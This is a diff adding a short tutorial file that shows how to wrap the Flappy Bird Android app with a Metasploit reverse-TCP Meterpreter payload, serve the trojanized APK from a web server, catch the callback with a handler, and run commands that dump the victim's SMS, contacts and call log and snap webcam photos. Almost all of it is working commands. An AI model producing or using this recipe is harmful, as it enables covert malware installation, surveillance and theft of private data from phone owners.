@@ -1,0 +1,44 @@
+First Download flappybird apk
+https://en.softonic.com/download/flappy-bird/android/post-download
+apk name =flappy_bird-v1-3.apk
+
+msfvenom -x flappy_bird-v1-3.apk -p android/meterpreter/reverse_tcp LHOST=192.168.29.139 LPORT=4444 -o sachinvr.apk
+
+if zipalign show erro then install 
+apt install zipalign
+
+service apache2 start
+mv sachinvr.apk /var/www/html
+
+msfconsole
+use exploit/multi/handler
+set payload 
+android/meterpreter/reverse_tcp
+set LHOST 192.168.29.139
+set LPORT 4444
+
+
+optional---set ExitOnSession false //use this because if session is disconnect sl
+o we have to start from start so that is the reason i Have use ExitOnSession for denied from start
+
+show options
+run
+
+open mobile and note mobile should be connectecd to same network 
+http://192.168.29.139/sachinvr.apk
+
+dump_sms
+webcam_snap
+dump_contacts
+dump_calllog
+check_root
+webcam_list
+app_list
+
+
+check dump_sms on home login  kali linux
+
+
+
+if apk tool kit not found then install
+apt-get install -y apktool
